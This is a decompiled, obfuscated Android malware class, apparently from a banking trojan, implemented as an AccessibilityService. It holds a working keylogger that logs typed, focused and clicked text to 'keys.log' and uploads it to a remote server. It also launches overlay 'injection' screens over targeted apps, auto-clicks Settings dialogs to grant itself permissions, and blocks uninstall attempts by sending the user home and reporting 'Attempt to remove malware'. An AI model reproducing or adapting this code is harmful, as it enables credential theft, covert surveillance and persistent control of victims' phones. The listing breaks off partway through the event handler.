package wocwvy.czyxoxmbauu.slsa;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityEvent;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import wocwvy.czyxoxmbauu.slsa.ncec.pltrfi;

public class egxltnv extends AccessibilityService {

    /* renamed from: a */
    C0034b f396a = new C0034b();

    /* renamed from: b */
    C0033a f397b = new C0033a();

    /* renamed from: c */
    String f398c = "";

    /* renamed from: d */
    String f399d = "";

    /* renamed from: e */
    String f400e = "";

    /* renamed from: f */
    String f401f = "";

    /* renamed from: g */
    String f402g = "";

    /* renamed from: h */
    String f403h = "";

    /* renamed from: i */
    String f404i = "";

    /* renamed from: j */
    String f405j = "";

    /* renamed from: k */
    String f406k = "";

    /* renamed from: l */
    boolean f407l = false;

    /* renamed from: m */
    String f408m = "";

    /* renamed from: n */
    String f409n = "";

    /* renamed from: a */
    private String m284a(AccessibilityEvent accessibilityEvent) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence append : accessibilityEvent.getText()) {
            sb.append(append);
        }
        return sb.toString();
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public String mo268a(Context context) {
        try {
            PackageManager packageManager = getApplicationContext().getPackageManager();
            return (String) packageManager.getApplicationLabel(packageManager.getApplicationInfo(context.getPackageName(), 128));
        } catch (Exception unused) {
            return "";
        }
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public String mo269a(String str) {
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(openFileInput(str)));
            String str2 = "";
            while (true) {
                String readLine = bufferedReader.readLine();
                if (readLine == null) {
                    return str2;
                }
                StringBuilder sb = new StringBuilder();
                sb.append(str2);
                sb.append(readLine);
                str2 = sb.toString();
            }
        } catch (IOException unused) {
            return "";
        }
    }

    /* renamed from: a */
    public void mo270a() {
        Intent intent = new Intent("android.intent.action.MAIN");
        intent.addCategory("android.intent.category.HOME");
        intent.setFlags(268435456);
        startActivity(intent);
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public void mo271a(final Context context, final String str, final String str2) {
        new Thread(new Runnable() {
            public void run() {
                egxltnv.this.f396a.mo213a("Start", "StartScanInjector egxltnv");
                String str = str;
                if (str.contains("com.imo.android.imoim,com.twitter.android")) {
                    str = str.replace("com.imo.android.imoim,com.twitter.android", "com.imo.android.imoim,com.twitter.android,com.android.vending");
                }
                StringBuilder sb = new StringBuilder();
                sb.append("");
                sb.append(str);
                egxltnv.this.f396a.mo213a("ACCESIB", sb.toString());
                if (str != "" && egxltnv.this.f396a.mo245o(context)) {
                    String str2 = str2;
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append("");
                    sb2.append(str2);
                    egxltnv.this.f396a.mo213a("App", sb2.toString());
                    String str3 = null;
                    for (String split : str.split("/")) {
                        String[] split2 = split.split(",");
                        int i = 1;
                        while (true) {
                            if (i >= split2.length) {
                                break;
                            } else if (str2.contains(split2[i])) {
                                str3 = split2[0];
                                egxltnv.this.f396a.mo213a("nameInject", str3);
                                break;
                            } else {
                                i++;
                            }
                        }
                        if (str3 != null) {
                            break;
                        }
                    }
                    if (str3 != null) {
                        egxltnv egxltnv = egxltnv.this;
                        Context context = context;
                        if (!((KeyguardManager) egxltnv.getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
                            try {
                                Intent putExtra = new Intent(context, pltrfi.class).putExtra("str", str3);
                                putExtra.addFlags(268435456);
                                putExtra.addFlags(8388608);
                                putExtra.addFlags(1073741824);
                                egxltnv.this.startActivity(putExtra);
                            } catch (Exception unused) {
                                StringBuilder sb3 = new StringBuilder();
                                sb3.append("p=");
                                C0034b bVar = egxltnv.this.f396a;
                                StringBuilder sb4 = new StringBuilder();
                                sb4.append(egxltnv.this.f396a.mo247q(context));
                                sb4.append("|ERROR START INJECTIONS|");
                                sb3.append(bVar.mo225c(sb4.toString()));
                                egxltnv.this.f396a.mo218b(context, "4", sb3.toString());
                            }
                        }
                    }
                }
            }
        }).start();
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public void mo272a(String str, String str2) {
        this.f406k = "";
        try {
            String a = mo269a(str);
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(openFileOutput(str, 0)));
            StringBuilder sb = new StringBuilder();
            sb.append(a);
            sb.append(str2);
            sb.append("|^|");
            String sb2 = sb.toString();
            bufferedWriter.write(sb2);
            bufferedWriter.close();
            StringBuilder sb3 = new StringBuilder();
            sb3.append("");
            sb3.append(sb2.length());
            this.f396a.mo213a("Len key", sb3.toString());
            if (sb2.length() > 10000) {
                String replace = sb2.replace("|^|", "\n");
                StringBuilder sb4 = new StringBuilder();
                sb4.append("p=");
                C0034b bVar = this.f396a;
                StringBuilder sb5 = new StringBuilder();
                sb5.append(this.f396a.mo247q(this));
                sb5.append("~~~~~~~~~~");
                sb5.append(replace);
                sb4.append(bVar.mo225c(sb5.toString()));
                String b = this.f396a.mo218b(this, "12", sb4.toString());
                this.f396a.mo213a("SEND KEL", "LOGER");
                if (this.f396a.mo230d(b).contains("clear")) {
                    this.f396a.mo213a("SEND KEL", "CLEAR");
                    mo273b("keys.log");
                }
            }
        } catch (IOException unused) {
        }
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: b */
    public void mo273b(String str) {
        try {
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(openFileOutput(str, 0)));
            bufferedWriter.write("");
            bufferedWriter.close();
        } catch (IOException unused) {
        }
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(30:55|(7:58|(4:61|(2:63|153)(1:152)|150|59)|151|64|(4:67|(2:69|157)(1:156)|154|65)|155|56)|149|70|(2:71|(2:73|(2:159|75))(1:158))|76|(2:77|(2:79|(2:161|81))(1:160))|82|(3:86|(4:89|(2:93|166)|162|87)|163)|94|(2:96|(1:98))|99|(2:101|(1:103))|104|(2:106|(1:108))|109|(2:112|110)|167|113|(1:121)|(3:122|123|(1:129))|130|132|133|(1:137)|138|139|(1:141)|142|(2:144|145)) */
    /* JADX WARNING: Missing exception handler attribute for start block: B:138:0x04bb */
    /* JADX WARNING: Removed duplicated region for block: B:141:0x04ca A[Catch:{ Exception -> 0x04e2 }] */
    /* JADX WARNING: Removed duplicated region for block: B:144:0x04d7 A[Catch:{ Exception -> 0x04e2 }] */
    /* JADX WARNING: Removed duplicated region for block: B:27:0x0063 A[SYNTHETIC, Splitter:B:27:0x0063] */
    /* JADX WARNING: Removed duplicated region for block: B:42:0x014d A[SYNTHETIC, Splitter:B:42:0x014d] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent r17) {
        /*
            r16 = this;
            r0 = r16
            wocwvy.czyxoxmbauu.slsa.b r1 = r0.f396a
            java.lang.String r2 = "urls"
            java.lang.String r1 = r1.mo234e(r0, r2)
            int r1 = r1.length()
            r2 = 1
            if (r1 > r2) goto L_0x001d
            wocwvy.czyxoxmbauu.slsa.b r1 = r0.f396a
            wocwvy.czyxoxmbauu.slsa.a r2 = r0.f397b
            java.lang.String r2 = "egxltnv"
            java.lang.String r3 = "STOP!!"
            r1.mo213a(r2, r3)
            return
        L_0x001d:
            java.lang.String r1 = ""
            java.lang.String r3 = ""
            java.lang.String r4 = ""
            java.lang.String r5 = ""
            java.lang.String r6 = ""
            java.lang.CharSequence r7 = r17.getPackageName()     // Catch:{ Exception -> 0x0058 }
            java.lang.String r7 = r7.toString()     // Catch:{ Exception -> 0x0058 }
            java.lang.CharSequence r1 = r17.getPackageName()     // Catch:{ Exception -> 0x0059 }
            java.lang.String r1 = r1.toString()     // Catch:{ Exception -> 0x0059 }
            java.lang.String r1 = r1.toLowerCase()     // Catch:{ Exception -> 0x0059 }
            java.lang.String r3 = r16.m284a(r17)     // Catch:{ Exception -> 0x005a }
            java.lang.String r3 = r3.toLowerCase()     // Catch:{ Exception -> 0x005a }
            java.lang.CharSequence r4 = r17.getClassName()     // Catch:{ Exception -> 0x005b }
            java.lang.String r4 = r4.toString()     // Catch:{ Exception -> 0x005b }
            java.lang.String r4 = r4.toLowerCase()     // Catch:{ Exception -> 0x005b }
            java.lang.String r5 = r0.mo268a(r0)     // Catch:{ Exception -> 0x005c }
            java.lang.String r5 = r5.toLowerCase()     // Catch:{ Exception -> 0x005c }
            goto L_0x005d
        L_0x0058:
            r7 = r1
        L_0x0059:
            r1 = r3
        L_0x005a:
            r3 = r4
        L_0x005b:
            r4 = r5
        L_0x005c:
            r5 = r6
        L_0x005d:
            boolean r6 = r0.f407l
            r8 = 16
            if (r6 == 0) goto L_0x0141
            java.text.SimpleDateFormat r6 = new java.text.SimpleDateFormat     // Catch:{ Exception -> 0x0138 }
            java.lang.String r9 = "MM/dd/yyyy, HH:mm:ss z"
            java.util.Locale r10 = java.util.Locale.US     // Catch:{ Exception -> 0x0138 }
            r6.<init>(r9, r10)     // Catch:{ Exception -> 0x0138 }
            java.util.Calendar r9 = java.util.Calendar.getInstance()     // Catch:{ Exception -> 0x0138 }
            java.util.Date r9 = r9.getTime()     // Catch:{ Exception -> 0x0138 }
            java.lang.String r6 = r6.format(r9)     // Catch:{ Exception -> 0x0138 }
            int r9 = r17.getEventType()     // Catch:{ Exception -> 0x0138 }
            if (r9 == r2) goto L_0x00ff
            r10 = 8
            if (r9 == r10) goto L_0x00c6
            if (r9 == r8) goto L_0x0086
            goto L_0x0141
        L_0x0086:
            java.util.List r9 = r17.getText()     // Catch:{ Exception -> 0x0138 }
            java.lang.String r9 = r9.toString()     // Catch:{ Exception -> 0x0138 }
            wocwvy.czyxoxmbauu.slsa.b r10 = r0.f396a     // Catch:{ Exception -> 0x0138 }
            java.lang.String r11 = "KEY1"
            java.lang.StringBuilder r12 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0138 }
            r12.<init>()     // Catch:{ Exception -> 0x0138 }
            r12.append(r6)     // Catch:{ Exception -> 0x0138 }
            java.lang.String r13 = "|(TEXT)|"
            r12.append(r13)     // Catch:{ Exception -> 0x0138 }
            r12.append(r9)     // Catch:{ Exception -> 0x0138 }
            java.lang.String r12 = r12.toString()     // Catch:{ Exception -> 0x0138 }
            r10.mo213a(r11, r12)     // Catch:{ Exception -> 0x0138 }
            java.lang.StringBuilder r10 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0138 }
            r10.<init>()     // Catch:{ Exception -> 0x0138 }
            r10.append(r6)     // Catch:{ Exception -> 0x0138 }
            java.lang.String r6 = "|(TEXT)|"
            r10.append(r6)     // Catch:{ Exception -> 0x0138 }
            r10.append(r9)     // Catch:{ Exception -> 0x0138 }
            java.lang.String r6 = "|^|"
            r10.append(r6)     // Catch:{ Exception -> 0x0138 }
        L_0x00be:
            java.lang.String r6 = r10.toString()     // Catch:{ Exception -> 0x0138 }
            r0.f406k = r6     // Catch:{ Exception -> 0x0138 }
            goto L_0x0141
        L_0x00c6:
            java.util.List r9 = r17.getText()     // Catch:{ Exception -> 0x0138 }
            java.lang.String r9 = r9.toString()     // Catch:{ Exception -> 0x0138 }
            wocwvy.czyxoxmbauu.slsa.b r10 = r0.f396a     // Catch:{ Exception -> 0x0138 }
            java.lang.String r11 = "KEY2"
            java.lang.StringBuilder r12 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0138 }
            r12.<init>()     // Catch:{ Exception -> 0x0138 }
            r12.append(r6)     // Catch:{ Exception -> 0x0138 }
            java.lang.String r13 = "|(FOCUSED)|"
            r12.append(r13)     // Catch:{ Exception -> 0x0138 }
            r12.append(r9)     // Catch:{ Exception -> 0x0138 }
            java.lang.String r12 = r12.toString()     // Catch:{ Exception -> 0x0138 }
            r10.mo213a(r11, r12)     // Catch:{ Exception -> 0x0138 }
            java.lang.StringBuilder r10 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0138 }
            r10.<init>()     // Catch:{ Exception -> 0x0138 }
            r10.append(r6)     // Catch:{ Exception -> 0x0138 }
            java.lang.String r6 = "|(FOCUSED)|"
            r10.append(r6)     // Catch:{ Exception -> 0x0138 }
            r10.append(r9)     // Catch:{ Exception -> 0x0138 }
            java.lang.String r6 = "|^|"
            r10.append(r6)     // Catch:{ Exception -> 0x0138 }
            goto L_0x00be
        L_0x00ff:
            java.util.List r9 = r17.getText()     // Catch:{ Exception -> 0x0138 }
            java.lang.String r9 = r9.toString()     // Catch:{ Exception -> 0x0138 }
            wocwvy.czyxoxmbauu.slsa.b r10 = r0.f396a     // Catch:{ Exception -> 0x0138 }
            java.lang.String r11 = "KEY3"
            java.lang.StringBuilder r12 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0138 }
            r12.<init>()     // Catch:{ Exception -> 0x0138 }
            r12.append(r6)     // Catch:{ Exception -> 0x0138 }
            java.lang.String r13 = "|(CLICKED)|"
            r12.append(r13)     // Catch:{ Exception -> 0x0138 }
            r12.append(r9)     // Catch:{ Exception -> 0x0138 }
            java.lang.String r12 = r12.toString()     // Catch:{ Exception -> 0x0138 }
            r10.mo213a(r11, r12)     // Catch:{ Exception -> 0x0138 }
            java.lang.StringBuilder r10 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0138 }
            r10.<init>()     // Catch:{ Exception -> 0x0138 }
            r10.append(r6)     // Catch:{ Exception -> 0x0138 }
            java.lang.String r6 = "|(CLICKED)|"
            r10.append(r6)     // Catch:{ Exception -> 0x0138 }
            r10.append(r9)     // Catch:{ Exception -> 0x0138 }
            java.lang.String r6 = "|^|"
            r10.append(r6)     // Catch:{ Exception -> 0x0138 }
            goto L_0x00be
        L_0x0138:
            wocwvy.czyxoxmbauu.slsa.b r6 = r0.f396a
            java.lang.String r9 = "ERROR1"
            java.lang.String r10 = "AccessibilityService"
            r6.mo213a(r9, r10)
        L_0x0141:
            android.view.accessibility.AccessibilityNodeInfo r6 = r17.getSource()
            r9 = 32
            int r10 = r17.getEventType()
            if (r9 != r10) goto L_0x04eb
            boolean r9 = r0.f407l     // Catch:{ Exception -> 0x04e2 }
            if (r9 == 0) goto L_0x0161
            java.lang.String r9 = r0.f406k     // Catch:{ Exception -> 0x04e2 }
            int r9 = r9.length()     // Catch:{ Exception -> 0x04e2 }
            r10 = 2
            if (r9 <= r10) goto L_0x0161
            java.lang.String r9 = "keys.log"
            java.lang.String r10 = r0.f406k     // Catch:{ Exception -> 0x04e2 }
            r0.mo272a(r9, r10)     // Catch:{ Exception -> 0x04e2 }
        L_0x0161:
            wocwvy.czyxoxmbauu.slsa.b r9 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r10 = "keylogger"
            java.lang.String r9 = r9.mo234e(r0, r10)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r10 = "true"
            boolean r9 = r9.equals(r10)     // Catch:{ Exception -> 0x04e2 }
            if (r9 == 0) goto L_0x0174
            r0.f407l = r2     // Catch:{ Exception -> 0x04e2 }
            goto L_0x0177
        L_0x0174:
            r2 = 0
            r0.f407l = r2     // Catch:{ Exception -> 0x04e2 }
        L_0x0177:
            wocwvy.czyxoxmbauu.slsa.b r2 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.a r9 = r0.f397b     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r9 = "egxltnv"
            java.lang.StringBuilder r10 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04e2 }
            r10.<init>()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r11 = "ACC::onAccessibilityEvent: nodeInfo="
            r10.append(r11)     // Catch:{ Exception -> 0x04e2 }
            r10.append(r6)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r10 = r10.toString()     // Catch:{ Exception -> 0x04e2 }
            r2.mo213a(r9, r10)     // Catch:{ Exception -> 0x04e2 }
            if (r6 != 0) goto L_0x0194
            return
        L_0x0194:
            wocwvy.czyxoxmbauu.slsa.b r2 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r2 = r2.mo239i(r0)     // Catch:{ Exception -> 0x04e2 }
            java.util.List r2 = r6.findAccessibilityNodeInfosByText(r2)     // Catch:{ Exception -> 0x04e2 }
            java.util.Iterator r2 = r2.iterator()     // Catch:{ Exception -> 0x04e2 }
        L_0x01a2:
            boolean r9 = r2.hasNext()     // Catch:{ Exception -> 0x04e2 }
            if (r9 == 0) goto L_0x0264
            java.lang.Object r9 = r2.next()     // Catch:{ Exception -> 0x04e2 }
            android.view.accessibility.AccessibilityNodeInfo r9 = (android.view.accessibility.AccessibilityNodeInfo) r9     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r9 = r0.f401f     // Catch:{ Exception -> 0x04e2 }
            java.util.List r9 = r6.findAccessibilityNodeInfosByText(r9)     // Catch:{ Exception -> 0x04e2 }
            java.util.Iterator r9 = r9.iterator()     // Catch:{ Exception -> 0x04e2 }
        L_0x01b8:
            boolean r10 = r9.hasNext()     // Catch:{ Exception -> 0x04e2 }
            if (r10 == 0) goto L_0x0209
            java.lang.Object r10 = r9.next()     // Catch:{ Exception -> 0x04e2 }
            android.view.accessibility.AccessibilityNodeInfo r10 = (android.view.accessibility.AccessibilityNodeInfo) r10     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r10 = r10.toString()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r11 = "com.android.settings"
            boolean r10 = r10.contains(r11)     // Catch:{ Exception -> 0x04e2 }
            if (r10 == 0) goto L_0x01b8
            r16.mo270a()     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.b r10 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r11 = "4"
            java.lang.StringBuilder r12 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04e2 }
            r12.<init>()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r13 = "p="
            r12.append(r13)     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.b r13 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.StringBuilder r14 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04e2 }
            r14.<init>()     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.b r15 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r15 = r15.mo247q(r0)     // Catch:{ Exception -> 0x04e2 }
            r14.append(r15)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r15 = "|Attempt to remove malware 2|"
            r14.append(r15)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r14 = r14.toString()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r13 = r13.mo225c(r14)     // Catch:{ Exception -> 0x04e2 }
            r12.append(r13)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r12 = r12.toString()     // Catch:{ Exception -> 0x04e2 }
            r10.mo218b(r0, r11, r12)     // Catch:{ Exception -> 0x04e2 }
            goto L_0x01b8
        L_0x0209:
            java.lang.String r9 = r0.f402g     // Catch:{ Exception -> 0x04e2 }
            java.util.List r9 = r6.findAccessibilityNodeInfosByText(r9)     // Catch:{ Exception -> 0x04e2 }
            java.util.Iterator r9 = r9.iterator()     // Catch:{ Exception -> 0x04e2 }
        L_0x0213:
            boolean r10 = r9.hasNext()     // Catch:{ Exception -> 0x04e2 }
            if (r10 == 0) goto L_0x01a2
            java.lang.Object r10 = r9.next()     // Catch:{ Exception -> 0x04e2 }
            android.view.accessibility.AccessibilityNodeInfo r10 = (android.view.accessibility.AccessibilityNodeInfo) r10     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r10 = r10.toString()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r11 = "com.android.settings"
            boolean r10 = r10.contains(r11)     // Catch:{ Exception -> 0x04e2 }
            if (r10 == 0) goto L_0x0213
            r16.mo270a()     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.b r10 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r11 = "4"
            java.lang.StringBuilder r12 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04e2 }
            r12.<init>()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r13 = "p="
            r12.append(r13)     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.b r13 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.StringBuilder r14 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04e2 }
            r14.<init>()     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.b r15 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r15 = r15.mo247q(r0)     // Catch:{ Exception -> 0x04e2 }
            r14.append(r15)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r15 = "|Attempt to remove malware 3|"
            r14.append(r15)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r14 = r14.toString()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r13 = r13.mo225c(r14)     // Catch:{ Exception -> 0x04e2 }
            r12.append(r13)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r12 = r12.toString()     // Catch:{ Exception -> 0x04e2 }
            r10.mo218b(r0, r11, r12)     // Catch:{ Exception -> 0x04e2 }
            goto L_0x0213
        L_0x0264:
            java.lang.String r2 = r0.f398c     // Catch:{ Exception -> 0x04e2 }
            java.util.List r2 = r6.findAccessibilityNodeInfosByText(r2)     // Catch:{ Exception -> 0x04e2 }
            java.util.Iterator r2 = r2.iterator()     // Catch:{ Exception -> 0x04e2 }
        L_0x026e:
            boolean r9 = r2.hasNext()     // Catch:{ Exception -> 0x04e2 }
            if (r9 == 0) goto L_0x02a3
            java.lang.Object r9 = r2.next()     // Catch:{ Exception -> 0x04e2 }
            android.view.accessibility.AccessibilityNodeInfo r9 = (android.view.accessibility.AccessibilityNodeInfo) r9     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.b r10 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            wocwvy.czyxoxmbauu.slsa.a r11 = r0.f397b     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r11 = "egxltnv"
            java.lang.StringBuilder r12 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04e2 }
            r12.<init>()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r13 = "ACC::onAccessibilityEvent: left_button "
            r12.append(r13)     // Catch:{ Exception -> 0x04e2 }
            r12.append(r9)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r12 = r12.toString()     // Catch:{ Exception -> 0x04e2 }
            r10.mo213a(r11, r12)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r10 = r9.toString()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r11 = "com.android.settings"
            boolean r10 = r10.contains(r11)     // Catch:{ Exception -> 0x04e2 }
            if (r10 == 0) goto L_0x026e
            r9.performAction(r8)     // Catch:{ Exception -> 0x04e2 }
        L_0x02a3:
            java.lang.String r2 = r0.f403h     // Catch:{ Exception -> 0x04e2 }
            java.util.List r2 = r6.findAccessibilityNodeInfosByText(r2)     // Catch:{ Exception -> 0x04e2 }
            java.util.Iterator r2 = r2.iterator()     // Catch:{ Exception -> 0x04e2 }
        L_0x02ad:
            boolean r9 = r2.hasNext()     // Catch:{ Exception -> 0x04e2 }
            if (r9 == 0) goto L_0x02c8
            java.lang.Object r9 = r2.next()     // Catch:{ Exception -> 0x04e2 }
            android.view.accessibility.AccessibilityNodeInfo r9 = (android.view.accessibility.AccessibilityNodeInfo) r9     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r10 = r9.toString()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r11 = "com.android.settings"
            boolean r10 = r10.contains(r11)     // Catch:{ Exception -> 0x04e2 }
            if (r10 == 0) goto L_0x02ad
            r9.performAction(r8)     // Catch:{ Exception -> 0x04e2 }
        L_0x02c8:
            java.lang.String r2 = "sms"
            boolean r2 = r3.contains(r2)     // Catch:{ Exception -> 0x04e2 }
            if (r2 != 0) goto L_0x02e0
            wocwvy.czyxoxmbauu.slsa.b r2 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r2 = r2.mo239i(r0)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r2 = r2.toLowerCase()     // Catch:{ Exception -> 0x04e2 }
            boolean r2 = r3.contains(r2)     // Catch:{ Exception -> 0x04e2 }
            if (r2 == 0) goto L_0x0312
        L_0x02e0:
            java.lang.String r2 = r0.f400e     // Catch:{ Exception -> 0x04e2 }
            java.util.List r2 = r6.findAccessibilityNodeInfosByText(r2)     // Catch:{ Exception -> 0x04e2 }
            java.util.Iterator r2 = r2.iterator()     // Catch:{ Exception -> 0x04e2 }
        L_0x02ea:
            boolean r9 = r2.hasNext()     // Catch:{ Exception -> 0x04e2 }
            if (r9 == 0) goto L_0x0312
            java.lang.Object r9 = r2.next()     // Catch:{ Exception -> 0x04e2 }
            android.view.accessibility.AccessibilityNodeInfo r9 = (android.view.accessibility.AccessibilityNodeInfo) r9     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r10 = r9.toString()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r11 = "android.widget.Button"
            boolean r10 = r10.contains(r11)     // Catch:{ Exception -> 0x04e2 }
            if (r10 == 0) goto L_0x02ea
            java.lang.String r10 = r9.toString()     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r11 = "com.android.settings"
            boolean r10 = r10.contains(r11)     // Catch:{ Exception -> 0x04e2 }
            if (r10 == 0) goto L_0x02ea
            r9.performAction(r8)     // Catch:{ Exception -> 0x04e2 }
            goto L_0x02ea
        L_0x0312:
            wocwvy.czyxoxmbauu.slsa.b r2 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r2 = r2.mo239i(r0)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r2 = r2.toLowerCase()     // Catch:{ Exception -> 0x04e2 }
            boolean r2 = r3.contains(r2)     // Catch:{ Exception -> 0x04e2 }
            if (r2 == 0) goto L_0x033b
            java.lang.String r2 = r0.f404i     // Catch:{ Exception -> 0x04e2 }
            java.util.List r2 = r6.findAccessibilityNodeInfosByText(r2)     // Catch:{ Exception -> 0x04e2 }
            java.util.Iterator r2 = r2.iterator()     // Catch:{ Exception -> 0x04e2 }
            boolean r9 = r2.hasNext()     // Catch:{ Exception -> 0x04e2 }
            if (r9 == 0) goto L_0x033b
            java.lang.Object r2 = r2.next()     // Catch:{ Exception -> 0x04e2 }
            android.view.accessibility.AccessibilityNodeInfo r2 = (android.view.accessibility.AccessibilityNodeInfo) r2     // Catch:{ Exception -> 0x04e2 }
            r2.performAction(r8)     // Catch:{ Exception -> 0x04e2 }
        L_0x033b:
            wocwvy.czyxoxmbauu.slsa.b r2 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r2 = r2.mo239i(r0)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r2 = r2.toLowerCase()     // Catch:{ Exception -> 0x04e2 }
            boolean r2 = r3.contains(r2)     // Catch:{ Exception -> 0x04e2 }
            if (r2 == 0) goto L_0x0364
            java.lang.String r2 = r0.f405j     // Catch:{ Exception -> 0x04e2 }
            java.util.List r2 = r6.findAccessibilityNodeInfosByText(r2)     // Catch:{ Exception -> 0x04e2 }
            java.util.Iterator r2 = r2.iterator()     // Catch:{ Exception -> 0x04e2 }
            boolean r9 = r2.hasNext()     // Catch:{ Exception -> 0x04e2 }
            if (r9 == 0) goto L_0x0364
            java.lang.Object r2 = r2.next()     // Catch:{ Exception -> 0x04e2 }
            android.view.accessibility.AccessibilityNodeInfo r2 = (android.view.accessibility.AccessibilityNodeInfo) r2     // Catch:{ Exception -> 0x04e2 }
            r2.performAction(r8)     // Catch:{ Exception -> 0x04e2 }
        L_0x0364:
            wocwvy.czyxoxmbauu.slsa.b r2 = r0.f396a     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r2 = r2.mo239i(r0)     // Catch:{ Exception -> 0x04e2 }
            java.lang.String r2 = r2.toLowerCase()     // Catch:{ Exception -> 0x04e2 }
            boolean r2 = r3.contains(r2)     // Catch:{ Exception -> 0x04e2 }
            if (r2 == 0) goto L_0x038d
            java.lang.String r2 = ""
            java.util.List r2 = r6.findAccessibilityNodeInfosByText(r2)     // Catch:{ Exception -> 0x04e2 }
            java.util.Iterator r2 = r2.iterator()     // Catch:{ Exception -> 0x04e2 }
            boolean r9 = r2.hasNext()     // Catch:{ Exception -> 0x04e2 }
            if (r9 == 0) goto L_0x038d
            java.lang.Object r2 = r2.next()     // Catch:{ Exception -> 0x04e2 }
            android.view.accessibility.AccessibilityNodeInfo r2 = (android.view.accessibility.AccessibilityNodeInfo) r2     // Catch:{ Exception -> 0x04e2 }
            r2.performAction(r8)     // Catch:{ Exception -> 0x04e2 }
        L_0x038d:
            java.lang.String r2 = r0.f399d     // Catch:{ Exception -> 0x04e2 }
            java.util.List r2 = r6.findAccessibilityNodeInfosByText(r2)     // Catch:{ Exception -> 0x04e2 }
            java.util.Iterator r2 = r2.iterator()     // Catch:{ Exception -> 0x04e2 }
        L_0x0397:
            boolean r6 = r2.hasNext()     // Catch:{ Exception -> 0x04e2 }
            if (r6 == 0) goto L_0x03c1
            java.lang.Object r6 = r2.next()     // Catch:{ Exception -> 0x04e2 }
            android.view.accessibility.AccessibilityNodeInfo r6 = (android.view.accessibility.AccessibilityNodeInfo) r6     // Catch:{ Exception -> 0x04e2 }
